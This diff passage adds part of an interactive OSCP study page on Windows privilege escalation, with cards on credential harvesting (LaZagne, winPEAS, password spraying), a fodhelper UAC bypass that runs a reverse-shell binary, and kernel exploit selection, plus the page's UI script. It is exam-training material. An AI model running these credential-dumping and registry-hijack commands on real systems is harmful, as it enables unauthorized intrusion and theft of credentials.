+    {label:"Way 3 — Automate the sweep",tag:"tools",note:"LaZagne pulls creds from 50+ apps; winPEAS has a creds section.",code:'<span class="fn">lazagne.exe</span> all\n<span class="fn">winPEASx64.exe</span> | findstr /i "password cred"'}],
+   oscp:"All allowed. This is the <b>most overlooked</b> vector — do it early. A found password can skip the whole ladder, and credential <b>reuse</b> across SMB/WinRM/RDP/the domain is a constant exam theme.",
+   watch:"Don't just collect creds — <b>spray them everywhere</b>. The password in web.config is often the local admin's, or a domain user's. Try evil-winrm, psexec, and RDP with every pair you find."},
+
+  {id:"uac",kind:"red",short:"UAC bypass",title:"UAC Bypass (medium → high)",sub:"you're a local admin but stuck at medium integrity",prereq:"admin + UAC default",os:"Win10/11",diff:"med",
+   analogy:"You're an admin, but Windows makes you <b>ask permission</b> (UAC) before using those powers — like having a manager's keycard that beeps for a supervisor every time. A UAC bypass uses a trusted Windows program that auto-elevates <b>without</b> the beep, and makes it run your code.",
+   why:"Admin users run at <b>medium integrity</b> by default; real power is <b>high integrity</b>. Certain Microsoft binaries auto-elevate silently and read a <b>user-writable</b> registry key before launching — hijack that key and your command runs high-integrity. Needed when you're admin but <code>whoami /priv</code> looks weak.",
+   enum:[T("spot.cmd",'<span class="fn">whoami</span> <span class="fl">/groups</span> | findstr /i "High Medium"   <span class="cmt">:: your integrity level</span>\n<span class="fn">net localgroup</span> administrators            <span class="cmt">:: am I an admin?</span>\n<span class="fn">reg query</span> HKLM\\...\\Policies\\System /v ConsentPromptBehaviorAdmin  <span class="cmt">:: 5 = default, bypassable</span>')],
+   ways:[
+    {label:"Way 1 — fodhelper",tag:"most reliable",note:"fodhelper.exe auto-elevates and reads an HKCU ms-settings key.",code:'<span class="fn">reg add</span> "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "cmd /c C:\\temp\\rev.exe" /f\n<span class="fn">reg add</span> "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v DelegateExecute /d "" /f\n<span class="fn">start</span> fodhelper.exe\n<span class="cmt">:: cleanup: reg delete "HKCU\\Software\\Classes\\ms-settings" /f</span>'},
+    {label:"Way 2 — computerdefaults / wsreset / sdclt",tag:"if patched",note:"Same idea, different auto-elevate binary — try these if fodhelper is patched.",code:'<span class="cmt">:: computerdefaults.exe uses the same ms-settings key</span>\n<span class="fn">start</span> computerdefaults.exe\n<span class="cmt">:: wsreset.exe uses an AppX class key; sdclt.exe uses App Paths</span>'},
+    {label:"Way 3 — UACME (prebuilt, 70+ methods)",tag:"swiss army",note:"Akagi picks a known-good method by number.",code:'<span class="fn">Akagi64.exe</span> 33 cmd.exe   <span class="cmt">:: 33 = fodhelper</span>\n<span class="fn">Akagi64.exe</span> 34 cmd.exe   <span class="cmt">:: 34 = computerdefaults</span>'}],
+   oscp:"Allowed — these are manual registry tricks. Only relevant once you're <b>already a local admin</b> at medium integrity; if you have SeImpersonate instead, skip UAC entirely and go straight to SYSTEM via a Potato.",
+   watch:"If you're not in the Administrators group, UAC bypass does nothing — it elevates an admin from medium to high, it doesn't create admin rights. Clean up the registry keys you add."},
+
+  {id:"kernel",kind:"red",short:"Kernel exploit",title:"Kernel Exploits — Last Resort",sub:"unpatched OS build",prereq:"missing hotfixes",os:"version-specific",diff:"hard",
+   analogy:"A kernel exploit is a <b>battering ram</b>: it attacks Windows itself, not a misconfiguration. Powerful, but it can bring the whole wall down. Use it only when nothing gentler works.",
+   why:"An unpatched build may be vulnerable to a public kernel exploit that flips you straight to SYSTEM. Match the <code>systeminfo</code> hotfix list against a suggester to find candidates — but these can crash the box, so they're the <b>last</b> thing you try.",
+   enum:[T("suggest.cmd",'<span class="fn">systeminfo</span> &gt; si.txt   <span class="cmt">:: capture OS build + installed KBs</span>\n<span class="cmt">:: on Kali — WES-NG (actively maintained)</span>\n<span class="fn">wes.py</span> si.txt -i "Elevation of Privilege" --exploits-only\n<span class="cmt">:: in-session enum</span>\n<span class="fn">.\\Watson.exe</span>   /   <span class="fn">Sherlock.ps1</span>')],
+   ways:[
+    {label:"Way 1 — Match & run a known PoC",tag:"targeted",note:"Common OSCP-era wins: MS16-032, MS15-051, PrintNightmare, SeriousSAM/HiveNightmare.",code:'<span class="cmt">:: get the matching compiled exploit, test it, understand it,</span>\n<span class="cmt">:: then run it — expect it may reboot or crash the target.</span>\n<span class="fn">.\\exploit.exe</span>   <span class="cmt">:: e.g. a compiled MS16-032 / PrintNightmare PoC</span>'}],
+   oscp:"Public PoCs you compile and run yourself are <b>allowed</b>. WES-NG / Watson / Sherlock are enumeration — fine. Prefer a precompiled, tested binary over compiling on the box mid-exam.",
+   watch:"Reliability is poor and a crash can <b>cost you the box</b> mid-exam. Exhaust services, tokens, tasks, creds and AlwaysInstallElevated <b>first</b>. Know what the exploit does before you fire it."}
+  ];
+  var KCOL={gold:"var(--gold-fill)",cyan:"var(--cyan)",red:"var(--red)"};
+
+  /* ---------- build cards ---------- */
+  var cardsEl=document.getElementById("cards");
+  V.forEach(function(v,i){
+    var el=document.createElement("div");
+    el.className="card";el.id="card-"+v.id;
+    var dcls=v.diff==="easy"?"diff-easy":v.diff==="med"?"diff-med":"diff-hard";
+    var dlabel=v.diff==="easy"?"beginner":v.diff==="med"?"moderate":"advanced";
+    var waysHtml=v.ways.map(function(w){
+      return '<div class="way"><div class="way-h">'+w.label+(w.tag?'<span class="wtag">'+w.tag+'</span>':'')+'</div>'+
+        (w.note?'<p class="way-note">'+w.note+'</p>':'')+T(w.label.replace(/[^a-z0-9]+/gi,'-').toLowerCase()+'.cmd',w.code)+'</div>';
+    }).join("");
+    var enumHtml=v.enum.map(function(e){return e;}).join("");
+    el.innerHTML=
+      '<div class="card-head" role="button" tabindex="0" aria-expanded="false">'+
+        '<span class="idx">'+(i<9?'0':'')+(i+1)+'</span>'+
+        '<span class="ttl">'+v.title+'<small>'+v.sub+'</small></span>'+
+        '<span class="badges"><span class="badge prereq">'+v.prereq+'</span><span class="badge">'+v.os+'</span><span class="badge '+dcls+'">'+dlabel+'</span></span>'+
+        '<span class="chev">▸</span>'+
+      '</div>'+
+      '<div class="card-body">'+
+        '<div class="block why"><span class="k">◆ Why it works</span><div class="analogy">'+v.analogy+'</div><p style="margin-top:10px">'+v.why+'</p></div>'+
+        '<div class="block spot"><span class="k">⌕ Spot it</span>'+enumHtml+'</div>'+
+        '<div class="block pop"><span class="k">⚡ Possible ways to abuse it</span>'+waysHtml+'</div>'+
+        '<div class="block oscp"><span class="k">🎯 OSCP note</span><div class="oscp-note">'+v.oscp+'</div></div>'+
+        '<div class="block watch"><span class="k">⚠ Watch out</span><div class="watch-note">'+v.watch+'</div></div>'+
+        '<div class="got"><button data-got="'+v.id+'"><span class="check"></span> Mark "got it"</button></div>'+
+      '</div>';
+    cardsEl.appendChild(el);
+    var head=el.querySelector(".card-head");
+    function toggle(){var o=el.classList.toggle("open");head.setAttribute("aria-expanded",o?"true":"false");}
+    head.addEventListener("click",toggle);
+    head.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();toggle();}});
+  });
+
+  /* ---------- progress ---------- */
+  var learned={};try{learned=JSON.parse(localStorage.getItem("cts-learned")||"{}")||{};}catch(e){learned={};}
+  function paintProgress(){var n=0;V.forEach(function(v){if(learned[v.id])n++;});document.getElementById("pbcount").textContent=n;document.getElementById("pbfill").style.width=(n/V.length*100)+"%";}
+  document.querySelectorAll("[data-got]").forEach(function(btn){
+    var id=btn.getAttribute("data-got");
+    function paint(){btn.classList.toggle("on",!!learned[id]);btn.querySelector(".check").textContent=learned[id]?"✓":"";btn.childNodes[1].textContent=learned[id]?' Understood':' Mark "got it"';}
+    paint();
+    btn.addEventListener("click",function(){learned[id]=!learned[id];try{localStorage.setItem("cts-learned",JSON.stringify(learned));}catch(e){}paint();paintProgress();});
+  });
+  paintProgress();
+
+  /* ---------- copy ---------- */
+  function wireCopy(scope){
+    (scope||document).querySelectorAll(".term[data-copy]").forEach(function(t){
+      if(t.__wired)return;t.__wired=1;
+      var btn=t.querySelector(".copy"),pre=t.querySelector("pre");if(!btn||!pre)return;
+      btn.addEventListener("click",function(){
+        var done=function(){btn.textContent="copied ✓";btn.classList.add("done");setTimeout(function(){btn.textContent="copy";btn.classList.remove("done");},1400);};
+        function fallback(){try{var r=document.createRange();r.selectNodeContents(pre);var s=window.getSelection();s.removeAllRanges();s.addRange(r);document.execCommand("copy");s.removeAllRanges();done();}catch(err){btn.textContent="select all";setTimeout(function(){btn.textContent="copy";},1600);}}
+        try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(pre.innerText).then(done,fallback);}else fallback();}catch(e){fallback();}
+      });
+    });
+  }
+  wireCopy();
+
+  /* ---------- expand / collapse ---------- */
+  document.getElementById("expand").addEventListener("click",function(){document.querySelectorAll("#cards .card").forEach(function(c){c.classList.add("open");c.querySelector(".card-head").setAttribute("aria-expanded","true");});});
+  document.getElementById("collapse").addEventListener("click",function(){document.querySelectorAll("#cards .card").forEach(function(c){c.classList.remove("open");c.querySelector(".card-head").setAttribute("aria-expanded","false");});});
+
+  /* ---------- search filter ---------- */
+  var q=document.getElementById("q"),qclr=document.getElementById("qclr"),nohit=document.getElementById("nohit");
+  function filter(){
+    var term=(q.value||"").trim().toLowerCase();qclr.style.display=term?"block":"none";
+    var hits=0;
+    document.querySelectorAll("#cards .card").forEach(function(c){
+      var match=!term||c.textContent.toLowerCase().indexOf(term)>=0;
+      c.style.display=match?"":"none";
+      if(match){hits++;if(term){c.classList.add("open");c.querySelector(".card-head").setAttribute("aria-expanded","true");}}
+    });
+    nohit.style.display=hits?"none":"block";
+  }
+  q.addEventListener("input",filter);
+  qclr.addEventListener("click",function(){q.value="";filter();q.focus();});
+
+  /* ---------- mindmap ---------- */
+  var SVGNS="http://www.w3.org/2000/svg",edgesG=document.getElementById("edges"),nodesG=document.getElementById("nodes");
+  var CX=168,CY=240,startX=560,topY=40,botY=440;
+  function elc(tag,a){var e=document.createElementNS(SVGNS,tag);for(var k in a)e.setAttribute(k,a[k]);return e;}
+  var cg=elc("g",{class:"node",tabindex:"0","aria-label":"whoami /priv — start here"});
+  cg.appendChild(elc("circle",{class:"chip center-chip",cx:CX,cy:CY,r:58,fill:"var(--bg-2)",stroke:"var(--gold-fill)","stroke-width":"2.5"}));
+  var t0=elc("text",{x:CX,y:CY-28,"text-anchor":"middle","font-size":"9",fill:"var(--text-faint)","letter-spacing":"1.5"});t0.textContent="START";
+  var t1=elc("text",{x:CX,y:CY-6,"text-anchor":"middle","font-size":"15",fill:"var(--gold)"});t1.textContent="whoami";
+  var t2=elc("text",{x:CX,y:CY+15,"text-anchor":"middle","font-size":"15",fill:"var(--gold)"});t2.textContent="/priv";
+  cg.appendChild(t0);cg.appendChild(t1);cg.appendChild(t2);
+  if(!RM)cg.querySelector("circle").appendChild(elc("animate",{attributeName:"r",values:"58;61;58",dur:"3s",repeatCount:"indefinite"}));
+  nodesG.appendChild(cg);
+  var n=V.length;
+  V.forEach(function(v,i){
+    var y=topY+(botY-topY)*(i/(n-1)),x=startX,col=KCOL[v.kind];
+    var d="M "+(CX+58)+" "+CY+" C "+(CX+150)+" "+CY+", "+(x-120)+" "+y+", "+(x-4)+" "+y;
+    var edge=elc("path",{class:"edge",d:d});edgesG.appendChild(edge);
+    var g=elc("g",{class:"node",tabindex:"0",role:"button","aria-label":v.short});
+    var w=Math.max(150,v.short.length*8.4+40);
+    g.appendChild(elc("rect",{class:"chip",x:x,y:y-16,width:w,height:32,rx:9,fill:"var(--bg-2)",stroke:col,"stroke-width":"1.8"}));
+    g.appendChild(elc("circle",{cx:x+16,cy:y,r:5,fill:col}));
+    var tx=elc("text",{x:x+30,y:y+4.5,"font-size":"12.5",fill:"var(--text)"});tx.textContent=v.short;g.appendChild(tx);
+    nodesG.appendChild(g);
+    function jump(){var card=document.getElementById("card-"+v.id);if(!card)return;if(!card.classList.contains("open"))card.querySelector(".card-head").click();card.scrollIntoView({behavior:RM?"auto":"smooth",block:"center"});card.classList.add("flash");setTimeout(function(){card.classList.remove("flash");},1400);}
+    g.addEventListener("click",jump);
+    g.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();jump();}});
+    g.addEventListener("mouseenter",function(){edge.setAttribute("stroke",col);edge.setAttribute("stroke-width","3");nodesG.querySelectorAll(".node").forEach(function(o){if(o!==g&&o!==cg)o.classList.add("dim");});});
+    g.addEventListener("mouseleave",function(){edge.setAttribute("stroke","var(--border-strong)");edge.setAttribute("stroke-width","2");nodesG.querySelectorAll(".node").forEach(function(o){o.classList.remove("dim");});});
+  });
+})();
+</script>
+
+</body></html>
